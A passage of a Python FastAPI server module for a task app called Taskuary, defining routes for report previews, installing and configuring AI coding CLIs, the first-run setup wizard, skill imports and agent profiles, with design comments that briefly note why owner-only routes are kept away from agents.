                            'types': [s.get('type') for s in out['sources']]})
    return out

@app.post('/api/reports/preview')
def report_preview(body: dict):
    """Dry-run a report config - executor plus the AI pass when ai_prompt is set -
    without filing a row. Exactly what a scheduled run would produce."""
    # ...including the write, when the executor IS a write (intacct_create posts the bill): the
    # card's switch and its scope apply to a dry run exactly as to a scheduled one (audit 2026-09-02)
    from .reports import card_of
    from . import scopes
    t = (body or {}).get('type')
    if t == 'zoho_monthly_invoices':
        selected = len((body or {}).get('customers') or [])
        return {'ok': bool(selected), 'headline': f'{selected} customer invoice(s) per monthly batch',
                'summary': ('The schedule opens an editable batch. Prepare creates Zoho drafts; each email waits on the task. Nothing sends automatically.'
                            if selected else 'Choose at least one Zoho customer.'), 'rows': selected, 'chart': ''}
    conn = store.get_connector_by_type(card_of(t)) if t in REGISTRY and card_of(t) else None
    if conn:
        if not conn.get('Active'): return {'ok': False, 'error': f'the {card_of(t)} connection is off - turn it on under Connections'}
        try: scopes.require(conn, t)
        except PermissionError as e: return {'ok': False, 'error': str(e)[:500]}
    try:
        head, summary = render_report(store, body, _llm() if body.get('ai_prompt') else None)
        # the chart is half of what a scheduled run hands back, so the dry run has to show it -
        # rendered in memory here, since a preview files no message to hang an attachment on
        from .artifacts import chart_directive, rows_from_body, strip_directive, to_svg_chart
        svg, rows = '', rows_from_body(summary)
        if rows and str(store.get_setting('report_images_enabled') or '1') == '1':
            val, lab, ctitle = chart_directive(summary)
            svg = to_svg_chart(rows, None, ctitle or body.get('title') or head, val, lab) or ''
        return {'ok': True, 'headline': head, 'summary': strip_directive(summary)[:4000],
                'rows': len(rows), 'chart': svg}
    except Exception as e:
        return {'ok': False, 'error': str(e)[:500]}

class SetupBody(BaseModel): dismissed: bool

@app.get('/api/cli/detect')
def cli_detect():
    """The AI CLIs on this machine. Most people already pay for one and have no separate API key,
    so the wizard offers what they have before it asks for a key."""
    from . import clis
    return {'data': clis.detect(store), 'tools': clis.tools()}    # tools: optional helpers (agent-browser), never offered as agents

class CliInstallBody(BaseModel):
    name: str
    terminal: bool = False

@app.post('/api/cli/install')
@app.post('/api/cli/install/terminal')
def cli_install(body: CliInstallBody):
    """Install a coding CLI on this machine. The owner's button - it is on guard.DENIED, because
    an agent that can run a vendor installer can be talked into running any installer.

    Returns immediately with the phase: an npm -g of a whole CLI is a minute on a slow line, and
    the browser polls /api/cli/install/state rather than holding a request open for it."""
    from . import cliinstall
    name = str(body.name or '')
    if name not in cliinstall.RECIPES:
        raise HTTPException(422, f'{name} is not one of the CLIs Taskuary installs '
                                 f'({", ".join(sorted(cliinstall.RECIPES))})')
    # one at a time, and say WHOSE - the phase is global, so a second press would otherwise poll
    # the first install's state and report its success as its own
    now = cliinstall.state()
    if now['phase'] == 'installing' and now['name'] != name:
        raise HTTPException(409, f'{now["name"]} is installing right now - one at a time')
    if body.terminal:
        from . import cli_install_terminal
        try: out = cli_install_terminal.start(store, name, actor=ACTOR)
        except (ValueError, RuntimeError, OSError) as e: raise HTTPException(422, str(e))
    else: out = cliinstall.start(name)
    store.audit('connector', 0, 'cli_install_started', ACTOR, detail={'name': name})
    return out

@app.post('/api/cli/update')
@app.post('/api/cli/update/terminal')
def cli_update(body: CliInstallBody):
    """Bring an already-installed CLI up to date, from the AI CLI agents page.

    A CLI too old for the model its own config pins fails every run and says so only in the JSON
    it writes to stdout - codex 0.148.0 answering "requires a newer version of Codex" to everything
    Taskuary asked it (the owner, 2026-09-11). On guard.DENIED beside /api/cli/install, and it
    reports through the same phase the install does: the page polls, it does not hold a request.
    """
    from . import cliinstall
    name = str(body.name or '')
    if name not in cliinstall.UPDATES:
        raise HTTPException(422, f'Taskuary has no updater for {name} '
                                 f'({", ".join(sorted(cliinstall.UPDATES))})')
    now = cliinstall.state()
    if now['phase'] == 'installing' and now['name'] != name:
        raise HTTPException(409, f'{now["name"]} is {now.get("verb") or "install"}ing right now - one at a time')
    if body.terminal:
        from . import cli_install_terminal
        try: out = cli_install_terminal.start(store, name, verb='update', actor=ACTOR)
        except (ValueError, RuntimeError, OSError) as e: raise HTTPException(422, str(e))
    else: out = cliinstall.start_update(name)
    store.audit('connector', 0, 'cli_update_started', ACTOR, detail={'name': name})
    return out

@app.get('/api/cli/install/state')
def cli_install_state():
    """Which phase the install is in, and the absolute path once there is one. The page saves
    THAT as the agent's cmd - a GUI app keeps the PATH it was launched with, so a profile that
    depends on PATH is a profile that works tomorrow instead of now."""
    from . import cliinstall
    return cliinstall.state()

class CliSetupBody(BaseModel): name: str; login: bool = False

@app.post('/api/cli/setup')
def cli_setup(body: CliSetupBody):
    """Open the CLI itself in a live pane, as a setup task on the Board, and let it run its own
    onboarding - settings, then the sign-in.

    On guard.DENIED beside /api/cli/install: an agent reads untrusted mail, and an agent that can
    run a CLI's setup on this machine can be talked into running one. A second press reattaches to
    the open pane rather than starting a second one beside it."""
    from . import clis, clisetup
    name = str(body.name or '')
    label = next((k['label'] for k in clis.KNOWN if k['name'] == name), '')
    try: return clisetup.start(store, name, ACTOR, label=label, login=body.login)
    # ...and every other way a PANE can fail to open is an answer too, not a crash: no pywinpty on
    # this Windows, a shim the ConPTY cannot spawn, a folder that is gone. The owner pressed Test,
    # watched it pass, pressed Set it up and got a bare 500 (2026-09-22). What stopped it is the
    # thing they need to read.
    except (ValueError, RuntimeError, OSError) as e:
        raise HTTPException(422, f'{name} could not be opened in a live pane - {e}')

@app.get('/api/setup')
def setup_state():
    """What still stands between this install and a working funnel, read off real state - so a
    step un-does itself if the connection behind it is removed. The ONE setup state (firstrun.state, what /api/setup/first-run
    answers) with the walk's checklist on it: the top bar's chip reads its `left` and `todo`, the canvas the rest."""
    from . import setup as setup_mod
    return setup_mod.page(store)

@app.post('/api/setup/dismiss')
def setup_dismiss(body: SetupBody):
    """"I know, leave me alone." A setting, so it stays dismissed across restarts - and it is
    reversible, because a checklist you cannot get back is a worse trap than one you cannot hide."""
    from . import setup as setup_mod, firstrun
    # the same flag Finish setup writes: put away on one road was still open on the other (2026-10-18)
    firstrun.set_dismissed(store, body.dismissed, ACTOR)
    store.audit('setting', 0, 'setup_dismiss' if body.dismissed else 'setup_reopen', ACTOR)
    return {'ok': True, **setup_mod.page(store)}

class SetupSeenBody(BaseModel): step: str

@app.post('/api/setup/seen')
def setup_seen(body: SetupSeenBody):
    """"I have seen that page." The models step asks you to look at where the four brains and their
    models are chosen, and a fresh install already ships working defaults - so there is nothing to
    derive and looking is the whole ask. The only stored step on the list.

    The map is closed: a typo'd step is a 422 rather than a setting nobody can find sitting behind a
    row that can never tick."""
    from . import setup as setup_mod
    key = {'models': setup_mod.SEEN_MODELS}.get(body.step)
    if not key: raise HTTPException(422, f'{body.step!r} is not a step that records being seen')
    # AiDefaults posts this on every mount of the models page, so the write and its audit row must
    # be idempotent - otherwise every visit logs a duplicate event that means nothing new.
    if str(store.get_setting(key) or '') != '1':
        store.set_setting(key, '1', ACTOR)
        store.audit('setting', 0, 'setup_seen', ACTOR, detail={'step': body.step})
    return setup_mod.state(store)

class SetupAdoptBrainBody(BaseModel): cli: str

@app.post('/api/setup/adopt-brain')
def setup_adopt_brain(body: SetupAdoptBrainBody):
    """The first CLI that proves it works becomes the triage brain - but only when none is chosen
    yet. CliPicker's `asBrain` branch used to be the only thing that ever wrote `triage_ai`; the
    checklist's "Set up an AI" row now points at the AI CLI agents page instead, and nothing there
    ever wrote it, so installing and testing a CLI there left that row stubbornly grey.

    `body.cli` names a CLI CONNECTION (`claude`, `codex`), and so does `cli:<x>` in `triage_ai` - a brain is the tool
    (agents.agent_row), never a profile (2026-10-15). Nothing is stored for a CLI that is not connected: a dangling
    `triage_ai` is worse than an unticked row.

    First writer wins, decided server-side. It is not a compare-and-set: `get_settings` and
    `set_setting` each take and release the store lock and sync routes run in a threadpool, so two
    tests landing together can race - and the loser's only cost is that the other valid CLI won."""
    from . import setup as setup_mod
    # the CONNECTION itself - a brain is the tool, never a profile running it (2026-10-15)
    worker = body.cli if dict(hub_agents.connection_brains(store)).get(body.cli) else ''
    current = str(store.get_setting('triage_ai') or '')
    adopted = bool(worker) and not current            # a brain the owner picked is theirs - never stomped by a Test
    if adopted:
        store.set_setting('triage_ai', f'cli:{worker}', ACTOR)
        store.audit('setting', 0, 'setup_adopt_brain', ACTOR, detail={'cli': body.cli, 'agent': worker, 'replaced': current or None})
        brain_arrived()
    return {'ok': True, 'adopted': adopted, **setup_mod.state(store)}


# ── first run: three questions on the assistant canvas (firstrun.py, FirstRun.jsx) ──────────────────────────────────────
class FirstRunAiBody(BaseModel): name: str
class FirstRunKeyBody(BaseModel): type: str; key: str; cid: int | None = None; config: dict | None = None
class FirstRunMailBody(BaseModel): type: str; address: str; password: str; host: str = ''; cid: int | None = None

@app.get('/api/setup/first-run')
def first_run_state():
    """Where the first run stands - pick your AI, connect your main source, reading - and the one line saying what to do next."""
    from . import firstrun
    return firstrun.state(store)

@app.post('/api/setup/first-run/ai')
def first_run_ai(body: FirstRunAiBody):
    """A CLI card was clicked: connected, tested and made the brain in one press - or the answer names the one fix."""
    from . import firstrun
    out = firstrun.choose_cli(store, cfg, body.name)
    if out.get('ok'): brain_arrived()
    return {**out, **firstrun.state(store)}

@app.post('/api/setup/first-run/key')
def first_run_key(body: FirstRunKeyBody):
    from . import firstrun
    out = firstrun.choose_key(store, body.type, body.key, cid=body.cid, config=body.config)
    if out.get('ok'): brain_arrived()
    return {**out, **firstrun.state(store)}

class FirstRunConnBody(BaseModel): cid: int


class FirstRunAboutBody(BaseModel):
    name: str = ''; org: str = ''; role: str = ''; systems: list = []; job: str = ''; signature: str | None = None
    docs: list[str] = []            # learn: which drafts to write (job, style, soul) - all three when none is named

class FirstRunDraftBody(BaseModel): doc: str; text: str = ''

# ABOUT YOUR WORK: one question a screen - name, organisation, title, systems, suggested from the mail - then the job description
# written from the mail with those in hand, for the owner to correct (firstrun.about / suggest_about / learn / job_state / save_about)
@app.get('/api/setup/first-run/about')
def first_run_about():
    from . import firstrun
    return firstrun.about(store)

@app.post('/api/setup/first-run/about/suggest')
def first_run_about_suggest():
    from . import firstrun
    return firstrun.suggest_about(store)

@app.get('/api/capabilities')
def capabilities():
    """What this install can do, for the screens that offer it - the one answer the server's own checks read (capabilities.py).
    A read like any other: the token gate lets an agent ask it and keeps a stranger's session out."""
    from . import capabilities as caps
    return caps.capabilities(store)

@app.post('/api/signature/learn')
def signature_learn():
    """The closing lines the owner's sent mail shares - read, not saved: Settings and setup show it to check first."""
    from . import responder
    try: return {'signature': responder.learn_signature(store)}
    except Exception as e: raise HTTPException(422, f"couldn't read your sent mail - {e}")

@app.post('/api/setup/first-run/about/learn')
def first_run_about_learn(body: FirstRunAboutBody):
    """The title answered or the mailboxes in: who they are saved, and the drafts named - JOB.md, STYLE.md, SOUL.md - written from the
    mail with it in the background (Write it again, too)."""
    from . import firstrun
    docs = [d for d in body.docs if d in firstrun.DRAFTS] or list(firstrun.DRAFTS)
    firstrun.learn(store, body.model_dump(exclude={'docs'}), docs=docs)
    return {**firstrun.job_state(store), 'drafts': firstrun.drafts(store)}

@app.get('/api/setup/first-run/about/job')
def first_run_about_job():
    from . import firstrun
    return firstrun.job_state(store)

@app.get('/api/setup/first-run/about/drafts')
def first_run_about_drafts():
    """Each setup draft's state - {job, style, soul}: none, running, ready (with its text) or failed (with why)."""
    from . import firstrun
    return firstrun.drafts(store)

@app.post('/api/setup/first-run/about/accept')
def first_run_about_accept(body: FirstRunDraftBody):
    """A draft's Looks right: the text as the owner left it, kept in its doc."""
    from . import firstrun
    try: return firstrun.accept(store, body.doc, body.text)
    except ValueError as e: raise HTTPException(404, str(e))

@app.post('/api/setup/first-run/about')
def first_run_about_save(body: FirstRunAboutBody):
    from . import firstrun
    firstrun.save_about(store, body.model_dump(exclude_none=True))
    return firstrun.state(store)

@app.post('/api/setup/first-run/about/skip')
def first_run_about_skip():
    from . import firstrun
    firstrun.skip_about(store)
    return firstrun.state(store)

@app.post('/api/setup/first-run/suggest-connections')
def first_run_suggest_connections():
    """What to connect next, from the setup answers and the job - the Advisor's line on More connections."""
    from . import firstrun
    return firstrun.suggest_connections(store)

@app.post('/api/setup/first-run/finish')
def first_run_finish():
    """Finish setup (or Walk me through my tasks): the canvas is the day from now on, until the top bar's Setup reopens it."""
    from . import firstrun, reports
    # never closed on a day that will not fill: no AI, or no mailbox, is said with what to do instead (firstrun.unfinished)
    if (why := firstrun.unfinished(store)): raise HTTPException(409, why)
    firstrun.finish(store)
    # ...and the opener's Morning digest is written now, once the mail is sorted - it says it waits, then that it writes
    try: firstrun.first_digest(store, lambda src: reports.run_one(store, src, _llm(), trigger='manual'))
    except Exception as e: logger.warning(f'setup: no first Morning digest - {e}')
    return firstrun.state(store)

@app.post('/api/setup/first-run/connector')
def first_run_connector(body: FirstRunConnBody):
    """A card that signed in (ChatGPT): tested and made the brain everywhere - or the answer says what it said."""
    from . import firstrun
    out = firstrun.choose_connector(store, body.cid)
    if out.get('ok'): brain_arrived()
    return {**out, **firstrun.state(store)}

@app.post('/api/setup/first-run/mail')
def first_run_mail(body: FirstRunMailBody):
    """Gmail or any IMAP mailbox, switched on and read at once - Microsoft 365 signs in through /ms/signin instead."""
    from . import firstrun
    out = firstrun.connect_mail(store, body.type, body.address, body.password, body.host, body.cid)
    if out.get('ok'):
        from .docsync import sync_connections
        try: sync_connections(store, ACTOR)
        except Exception as e: logger.debug(f'first run: connections doc not refreshed - {e}')
        threading.Thread(target=_poll_reports, kwargs={'what': 'syncing'}, daemon=True).start()
    return {**out, **firstrun.state(store)}


def brain_arrived():
    """A brain is ready for the first time: what waited for one is judged NOW, whatever its age, and the mail is read.
    The automatic sweep only reaches a day of mail and runs after a full pass, so a user who connected email before the AI
    looked at a pile of "awaiting AI triage" rows that nothing came back for (a first-run log, 2026-10-14)."""
    def go():
        from . import ingest as ingest_mod
        try: ingest_mod.retry_failed_triage(store, _llm(store), limit=300, hours=0, tries=0)
        except Exception as e: logger.warning(f'setup: the waiting mail could not be judged yet - {e}')
        try: _poll_reports(what='syncing')
        except Exception as e: logger.warning(f'setup: the first sync did not run - {e}')
    threading.Thread(target=go, daemon=True, name='brain-arrived').start()

class WalkBody(BaseModel): at: int

@app.get('/api/setup/walk')
def setup_walk():
    """Every stop on the scripted walk, with this install's own facts in it. No AI is involved: the
    chip this sits behind used to open an AI-led walk-through, which could not run before an AI was
    connected - which is when it gets pressed."""
    from . import walk
    return walk.state(store)

@app.post('/api/setup/walk')
def setup_walk_go(body: WalkBody):
    """Next, or a jump. Walking off the end is finishing, and `walk.go` clears the place so the next
    press starts over rather than reopening the last card forever."""
    from . import walk
    return walk.go(store, body.at, ACTOR)

@app.post('/api/setup/walk/reset')
def setup_walk_reset():
    from . import walk
    return walk.reset(store, ACTOR)

@app.get('/api/aws/catalog')
def aws_catalog(service: str = None):
    """The services and operations a report source can name, read off botocore's own models -
    so the two fields that used to be free text with an example in the placeholder can be
    picked from instead of remembered."""
    try:
        from .aws import catalog
        return catalog(store, service)
    except Exception as e:
        return {'seen': [], 'services': [], 'operations': [], 'error': str(e)[:300]}

@app.get('/api/mssql/drivers')
def mssql_drivers():
    try:
        from .mssql import drivers
        return {'data': drivers()}
    except Exception:
        return {'data': []}

@app.post('/api/mcp/tools')
def mcp_tools(body: dict):
    """List the tools an MCP server exposes (spawns it briefly over stdio)."""
    try:
        from .mcp import list_tools
        return {'ok': True, 'data': list_tools(body)}
    except Exception as e:
        return {'ok': False, 'error': str(e)[:500]}

@app.get('/api/sendfilter')
def sendfilter_list():
    """The owner's own MCP servers per CLI and each tool's verdict - kept, or left out of agent sessions because it sends (sendfilter):
    what a card shows so the owner can correct it. Reading it starts a scan when the last one is stale."""
    from . import sendfilter
    scanning = sendfilter.refresh(store)
    cache = sendfilter._load(store, sendfilter.CACHE, {}) or {}
    at, ai = float(cache.get('at') or 0), cache.get('claudeai') or {}
    return {'claude': sendfilter.verdicts(store, 'claude'), 'codex': sendfilter.verdicts(store, 'codex'),
            'scanned_at': at or None, 'scanning': scanning or sendfilter._RUNNING['on'],
            'claudeai': {'at': ai.get('at') or None, 'error': ai.get('error') or ''}}

class SendFilterFix(BaseModel): server: str; tool: str = '*'; verdict: str = ''

@app.post('/api/sendfilter/correct')
def sendfilter_correct(body: SendFilterFix):
    "The owner's word on one tool ('keep' / 'block'), or on a server whose tools could not be read (tool '*'); '' clears it."
    from . import sendfilter
    try: sendfilter.correct(store, body.server, body.tool, body.verdict, ACTOR)
    except ValueError as e: raise HTTPException(422, str(e))
    return sendfilter_list()

@app.post('/api/sendfilter/scan')
def sendfilter_scan():
    "List and judge the servers again now, in the background (a server just added, a description that changed)."
    from . import sendfilter
    return {'started': sendfilter.refresh(store, force=True)}

@app.post('/api/mssql/test')
def mssql_test(body: dict):
    """Body fields override the saved SQL Server connection (blank body = test the
    connector's saved connection)."""
    try:
        from .mssql import test
        return test(resolve_cfg(store, {**body, 'type': 'mssql'}))
    except ImportError:
        return {'ok': False, 'error': 'pyodbc is not installed - the SQL Server card needs it',
                'install': {'package': 'pyodbc', 'name': 'pyodbc'}}

# Models each CLI can be pointed at. The agent profile's own `model` (Connections → AI CLI
# agents) always wins as the default; these are the quick picks the run dialogs offer.
def cli_base(cmd) -> str:
    """'C:\\Users\\me\\...\\codex.exe' and 'codex' are the same CLI. A profile saved with the full
    path (the setup wizard writes what `where` found) offered no model list at all."""
    # both separators: a Windows path in a profile is still codex when the tests run on Linux CI
    return re.sub(r'\.(cmd|exe|bat|ps1)$', '', re.split(r'[\\/]', str(cmd or ''))[-1].lower())


def _agent_work(store_, books=None):
    """Existing work attached to each named worker: live task ownership and scheduled jobs.

    Playbooks and report skills remain the source of truth. This is only a projection for the
    agent card, so naming a worker does not create a second, competing skills system.
    """
    books = {b['slug']: b for b in playbooks.list_all()} if books is None else books
    out = {a['Name']: {'tasks': [], 'reports': []} for a in store_.list_agents(active_only=False)}
    for task in store_.list_tasks(active_only=True):
        assignee = str(task.get('Assignee') or '')
        if not assignee.startswith('agent:'): continue
        name = assignee[6:].strip()
        if not name: continue
        out.setdefault(name, {'tasks': [], 'reports': []})['tasks'].append({
            'taskId': task['TaskId'], 'ref': task_ref(task['TaskId']), 'title': task.get('Title') or '',
            'status': task.get('Status') or 'open', 'playbook': _playbook_brief(task, books),
        })

    # An agent report may be the one flat source or one card in a multi-source report. Either way,
    # the saved report already names the worker and skill; collect those declarations, do not infer
    # expertise from prompts or invent a job title.
    for source in store_.list_sources(active_only=False):
        if source.get('Channel') != 'report': continue
        try: cfg_ = json.loads(source.get('ConfigJson') or '{}')
        except (TypeError, ValueError): continue
        parts = [cfg_] if cfg_.get('type') == 'agent' else [
            s for s in cfg_.get('sources') or [] if isinstance(s, dict) and s.get('type') == 'agent']
        by_agent = {}
        for part in parts:
            name = str(part.get('agent') or cfg_.get('agent') or hub_agents.coding_role(store)).strip()
            skill = str(part.get('skill') or '').strip().lstrip('/')
            if name: by_agent.setdefault(name, set()).update([skill] if skill else [])
        for name, skills in by_agent.items():
            out.setdefault(name, {'tasks': [], 'reports': []})['reports'].append({
                'sourceId': source['SourceId'], 'title': cfg_.get('title') or source.get('Address') or 'Untitled report',
                'kind': 'workflow' if cfg_.get('access') == 'write' else 'report',
                'skills': sorted(skills), 'active': bool(source.get('Active')),
            })
    return out

@app.get('/api/cli/connections')
def list_cli_connections():
    from . import clis, climodels
    known = {r['name']: r for r in clis.detect(store) if not r.get('profile')}
    configured = cfg.get('cli_connections', {})
    rows = []
    for name in dict.fromkeys([*known, *configured]):
        command = configured.get(name) or {k: known[name][k] for k in cli_connections.COMMAND_FIELDS if k in known.get(name, {})}
        command = cli_connections.with_defaults(command)
        base = cli_connections.cli_key(command.get('cmd'))
        row = {**known.get(base, {}), **known.get(name, {}), 'name': name,
               'label': known.get(name, {}).get('label') or name,
               'config': command, 'configured': name in configured,
               'models': climodels.catalog(base),
               # the profiles on it - Remove names them before it leaves them with no CLI
               'used_by': [n for n, p in cfg.get('agents', {}).items() if p.get('provider') == f'cli:{name}']}
        if name in configured: row['installed'] = hub_agents.runs_here(command)
        rows.append(row)
    return {'data': rows}


@app.put('/api/cli/connections/{name}')
def put_cli_connection(name: str, body: dict):
    if not re.fullmatch(r'[a-z0-9][a-z0-9_-]*', name): raise HTTPException(422, 'Invalid connection name')
    if not isinstance(body.get('cmd'), str) or not body['cmd'].strip(): raise HTTPException(422, 'Command is required')
    if not isinstance(body.get('args', []), list) or any(not isinstance(a, str) for a in body.get('args', [])):
        raise HTTPException(422, 'Arguments must be a list of strings')
    if 'resume_args' in body and (not isinstance(body['resume_args'], list) or any(not isinstance(a, str) for a in body['resume_args'])):
        raise HTTPException(422, 'Resume arguments must be a list of strings')
    if 'timeout' in body and (not isinstance(body['timeout'], (int, float)) or body['timeout'] <= 0):
        raise HTTPException(422, 'Timeout must be a positive number')
    base = cli_connections.cli_key(body['cmd'])
    duplicate = next((key for key, c in cfg.get('cli_connections', {}).items()
                      if key != name and cli_connections.cli_key(c.get('cmd')) == base), None)
    if duplicate: raise HTTPException(409, f'This CLI already has a connection: {duplicate}. Edit that connection instead.')
    connection = cli_connections.with_defaults({k: v for k, v in body.items() if k in cli_connections.COMMAND_FIELDS})
    cfg.setdefault('cli_connections', {})[name] = connection
    config.save(cfg); pathcache.forget()     # a (re)connected CLI is looked up afresh by every page after it
    cli_connections.sync(cfg, store)
    store.audit('cli_connection', 0, 'save', ACTOR, detail=name)
    return {'ok': True}


@app.delete('/api/cli/connections/{name}')
def delete_cli_connection(name: str, detach: bool = False):
    """Remove a CLI connection. Profiles still on it are named first (409); `detach` removes it anyway and leaves those
    profiles with NO CLI - never quietly moved onto another one - until the owner picks one (the owner, 2026-10-06:
    "can't remove the claude cli install", with every shipped profile on it)."""
    users = [n for n, p in cfg.get('agents', {}).items() if p.get('provider') == f'cli:{name}']
    if users and not detach: raise HTTPException(409, f'Choose another provider for these profiles first: {", ".join(users)}')
    if name not in cfg.get('cli_connections', {}): raise HTTPException(404, 'Connection not found')
    from . import recentlydeleted                       # at once, with the page's Undo: the connection and its profiles' choice of it
    out = recentlydeleted.remove_cli(store, cfg, name, users)
    for n in users:
        prof = cfg['agents'][n]
        prof.pop('provider', None)
        for f in cli_connections.COMMAND_FIELDS: prof.pop(f, None)
    cfg['cli_connections'].pop(name)
    config.save(cfg); pathcache.forget()
    cli_connections.sync(cfg, store)
    store.audit('cli_connection', 0, 'delete', ACTOR, detail={'name': name, 'detached': users})
    return {'ok': True, 'detached': users, **out}


@app.post('/api/cli/connections/{name}/test')
def test_cli_connection(name: str):
    connection = cfg.get('cli_connections', {}).get(name)
    if not connection: raise HTTPException(404, 'Configure the CLI connection first')
    pathcache.forget()     # Test is the owner's "look again": it, and every page after it, sees PATH as it is now
    try:
        result, _, _ = hub_agents.run_cli({**connection, 'timeout': 30}, 'Reply with exactly: ok', lambda *a: None)
        hub_agents.record_cli_test(store, name, True)
        return {'ok': True, 'result': str(result or '')[:300]}
    except Exception as e:
        hub_agents.record_cli_test(store, name, False)     # a brain nobody chose is never one whose own test failed (ready_brains)
        return {'ok': False, 'error': str(e)[:400]}


class SkillPathBody(BaseModel):
    path: str
    paths: list | None = None      # the ones ticked in the catalogue; all of them when absent
class SkillImportBody(BaseModel): skills: list

@app.get('/api/skills/found')
def skills_found():
    """Skills already installed on this machine. Read-only, and only files - nothing is learned from
    another tool's configuration."""
    from . import skillimport
    return {'data': skillimport.found()}


@app.post('/api/skills/read')
def skills_read(body: SkillPathBody):
    """A path (a SKILL.md, or a plugin folder) turned into proposals. WRITES NOTHING: the owner reads
    the purpose and the body before any of it becomes a worker's instructions."""
    from . import skillimport
    try: entries = skillimport.read_path(body.path, body.paths)
    except ValueError as e: raise HTTPException(422, str(e))
    except OSError as e: raise HTTPException(422, f'could not read that: {e}')
    if not entries: raise HTTPException(422, 'no SKILL.md there')
    return _skill_proposals(entries)


class SkillUrlBody(BaseModel):
    url: str
    paths: list | None = None

@app.post('/api/skills/list')
def skills_list(body: SkillUrlBody):
    """WHAT IS THERE, before anything is read: one row per skill under a link or a folder - a name, a
    path and which plugin it belongs to. No bodies are fetched and no model is called, so a 252-skill
    repository is a catalogue to choose from rather than a refusal (the owner, 2026-09-18). The
    `paths` of the ones ticked come back to /read or /fetch, which brings in at most PICK_MAX."""
    from . import skillimport
    target = str(body.url or '').strip()
    try:
        rows = skillimport.list_url(target) if target[:8].lower() == 'https://' else skillimport.list_path(target)
    except ValueError as e: raise HTTPException(422, str(e))
    except OSError as e: raise HTTPException(422, f'could not read that: {e}')
    except Exception as e: raise HTTPException(422, f'could not read that: {str(e)[:200]}')
    if not rows: raise HTTPException(422, 'no SKILL.md there')
    return {'data': rows, 'max': skillimport.PICK_MAX}

@app.post('/api/skills/fetch')
def skills_fetch(body: SkillUrlBody):
    """A link - a raw SKILL.md, a GitHub file, or a GitHub repository or folder holding several -
    turned into proposals, the same shape as /read. WRITES NOTHING, and fetches only what the link
    names (skillimport.fetch_url says which shapes)."""
    from . import skillimport
    try: entries = skillimport.fetch_url(body.url, only=body.paths)
    except ValueError as e: raise HTTPException(422, str(e))
    except Exception as e: raise HTTPException(422, f'could not fetch that: {str(e)[:200]}')
    return _skill_proposals(entries)


def _skill_proposals(entries: list) -> dict:
    from . import skillimport, llm as llm_mod
    try: brain = llm_mod.build_llm(store, job='memory')
    except Exception: brain = None
    # `flat` is the body's length AS A SESSION RECEIVES IT and `doc_chars` is where the seed cuts a
    # rules document: the wizard warns from these, not from a byte count of the file. Of the fifteen
    # skills on the machine this was built on, eleven were over the cut and nine of those were under
    # the old 20KB "large" mark - they arrived truncated with nothing on screen saying so.
    return {'doc_chars': hub_term.DOC_CHARS,
            'data': [dict(skillimport.convert(e, brain), path=e['path'], bytes=e['bytes'],
                          flat=len(hub_term.flatten_rules(e.get('body') or '')), plugin=e.get('plugin') or '')
                     for e in entries]}


@app.post('/api/skills/import')
def skills_import(body: SkillImportBody):
    """Write the ones the owner confirmed. Each becomes an ordinary profile.

    A name that collides with a profile this import did not make is reported in `clashed`, not
    written - one bad name must not discard the rest of a confirmed batch. The wizard offers the
    owner a rename or a resend with that item's `replace: true`."""
    from . import skillimport
    made, clashed = [], []
    for s in (body.skills or []):
        try: made.append(skillimport.save(store, s, bool(s.get('enabled')), replace=bool(s.get('replace'))))
        except skillimport.ProfileCollision as e: clashed.append({'name': e.name, 'kind': e.kind, 'doc': e.doc})
        except (ValueError, OSError) as e: raise HTTPException(422, f'{s.get("name")!r}: {e}')
    # The profile goes into config.toml's table TOO, the way put_agent and seed_profiles write one:
    # the Agents page reads that table, and DELETE /api/agents 404s on a name absent from it - so a
    # profile living only in its store row could be neither edited nor removed anywhere in the UI
    # (seed_profiles' docstring records fixing exactly this once before). It starts from the coding
    # agent's CLI setup, as the shipped roles do, so it is runnable and editable on day one.
    if made:
        keep = hub_agents.cli_inheritance(cfg)
        for name in made:
            try: prof = json.loads((store.get_agent(name) or {}).get('Config') or '{}')
            except ValueError: prof = {}
            cfg.setdefault('agents', {})[name] = {**keep, **cfg['agents'].get(name, {}), **prof}
            try: cli_connections.sync(cfg, store, name)
            except ValueError: pass                # a dangling provider: the store row stands as save() wrote it
        config.save(cfg)
    store.audit('agent', 0, 'skills_imported', ACTOR, detail={'names': made, 'clashed': [c['name'] for c in clashed]})
    return {'imported': made, 'clashed': clashed}


@app.get('/api/agents')
def agents():
    """data = store rows (for dispatch pickers); config = the editable profiles;
    models = the quick-pick model list per agent, keyed by agent name."""
    from . import climodels

    def _models(a):
        prof = json.loads(a.get('Config') or '{}')
        cli = cli_base(prof.get('cmd'))
        cat = climodels.catalog(cli)                       # codex: its own /model list off disk; others: the built-in aliases
        return {'cmd': prof.get('cmd'), 'cli': cli, 'default': prof.get('model'), 'choices': cat['choices'],
                'models': cat['models'], 'current': cat['current'], 'source': cat['source']}
    # the default agent (a setting) comes FIRST: every picker's initial value is the head of
    # this list, so "which CLI opens when I hit Start session" is decided in one place
    # ...and "the default" is the one that can actually run: shipping coding=claude means a
    # machine with only codex installed had every dispatch aimed at a CLI nobody had.
    # A BRAIN THAT IS NOT INSTALLED IS NOT A CHOICE. brain_list was every key in cli_connections,
    # so a CLI the owner had removed - or one seeded and never installed - stayed on every dispatch
    # menu app-wide and failed only when it was started (the owner, 2026-09-18).
    conns = cfg.get('cli_connections') or {}
    brains_here = sorted(k for k in conns if hub_agents.runs_here(cli_connections.with_defaults(conns[k])))
    _cats = {}
    def _brain_cat(key):
        """One catalog read per CLI per request: `catalog` goes to disk, and this is asked twice a brain."""
        if key not in _cats: _cats[key] = climodels.catalog(cli_connections.cli_key(conns[key].get('cmd')) or key)
        return _cats[key]
    from . import general as _general
    head = hub_agents.default_agent(store)
    rows = sorted(store.list_agents(), key=lambda a: a['Name'] != head)
    profs = hub_agents.profiles(store)
    # `roster` is the line triage actually reads for this worker, or why there is none - answered
    # HERE so the Docs page shows the router's real view instead of re-deriving it from Config.
    return {'data': [{**a, 'installed': hub_agents.runs_here(profs.get(a['Name']) or {}),
                      'rules_doc': hub_agents.profile_document(store, a['Name']),
                      'roster': dict(zip(('line', 'reason', 'code'), hub_agents.roster_line(store, a))),
                      'purpose': hub_agents.profile_purpose(a['Name'], profs.get(a['Name']) or {}, a.get('Kind') or 'coding')}
                     for a in rows],
            'config': cfg.get('agents', {}), 'default': head,
            'models': {a['Name']: _models(a) for a in store.list_agents()},
            # WHICH BRAIN each role runs on. The card used to name the role, and after the roles
            # and brains were split every coding row would read `coding` - the owner asked for the
            # coding AGENT (2026-09-16). A brain is not a property of the task, so it is served
            # once per role here rather than stamped on every row.
            'brains': {a['Name']: hub_agents.brain_for(store, a['Name']) for a in rows},
